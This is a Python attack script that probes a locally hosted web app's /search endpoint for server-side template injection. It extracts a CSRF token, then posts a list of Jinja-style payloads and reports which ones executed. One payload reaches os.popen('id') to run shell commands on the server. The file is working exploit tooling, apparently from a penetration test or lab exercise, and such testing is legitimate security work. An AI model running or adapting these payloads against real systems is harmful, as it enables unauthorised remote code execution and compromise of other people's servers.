import requests
import re
import json
import sys
import time

# Configuration
base_url = "http://127.0.0.1:33077"
headers = {
    'Host': 'localhost',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
}

payloads = [
    "{{ 7*7 }}",
    "{{ config }}",
    "{{ 7*'7' }}",
    "{{''.__class__}}",
    "{{request.application.__globals__.__builtins__}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
]

print("[SSTI Testing] Starting SSTI tests on /search endpoint")
print(f"[Target] {base_url}/search")
print(f"[Headers] Host: localhost")

# Step 1: GET root page to extract CSRF token and session cookie
print("\n[1] Requesting root page to get CSRF token...")
csrf_token = None
session_cookie = None

try:
    session = requests.Session()
    response = session.get(base_url, headers=headers, timeout=10)
    print(f"[Response] Status: {response.status_code} | Length: {len(response.text)}B")
    
    csrf_match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', response.text)
    if csrf_match:
        csrf_token = csrf_match.group(1)
        print(f"[CSRF] Token extracted: {csrf_token[:30]}...")
    
    session_cookie = session.cookies.get('sessionid')
    if session_cookie:
        print(f"[Session] Cookie: {session_cookie[:30]}...")
    
except Exception as e:
    print(f"[Error] GET root failed: {e}")

# Step 2: Test SSTI payloads on /search
print("\n[2] Testing payloads on /search endpoint")
results = []

for idx, payload in enumerate(payloads, 1):
    print(f"\n[Payload {idx}] Testing: {payload}")
    
    post_data = {'search': payload}
    if csrf_token:
        post_data['csrfmiddlewaretoken'] = csrf_token
    
    try:
        resp = session.post(
            f"{base_url}/search",
            headers=headers,
            data=post_data,
            timeout=10,
            allow_redirects=False
        )
        
        print(f"[Response] Status: {resp.status_code} | Length: {len(resp.text)}B")
        
        analysis = {
            'contains_49': '49' in resp.text,
            'has_django_error': 'django' in resp.text.lower() or 'traceback' in resp.text.lower(),
            'payload_in_response': payload in resp.text,
            'has_x_powered_by': 'X-Powered-By' in resp.headers
        }
        
        snippet = resp.text[:500]
        print(f"[Snippet] {snippet[:200]}...")
        print(f"[Analysis] Contains '49': {analysis['contains_49']}")
        print(f"[Analysis] Django error: {analysis['has_django_error']}")
        print(f"[Analysis] Payload in response: {analysis['payload_in_response']}")
        
        executed = analysis['contains_49'] or (not payload in resp.text and '{{' not in resp.text)
        
        results.append({
            'idx': idx,
            'payload': payload,
            'status': resp.status_code,
            'analysis': analysis,
            'executed': executed
        })
        
    except Exception as e:
        print(f"[Error] POST failed: {e}")
        results.append({'idx': idx, 'payload': payload, 'error': str(e)})
    
    time.sleep(0.5)

# Summary
print("\n[3] Summary")
executed = sum(1 for r in results if r.get('executed', False))
filtered = len(payloads) - executed

for r in results:
    status = "EXECUTED" if r.get('executed', False) else "BLOCKED"
    print(f"[Payload {r['idx']}] {status}: {r['payload']}")

print(f"\nTotal: {len(payloads)} | Executed: {executed} | Blocked: {filtered}")
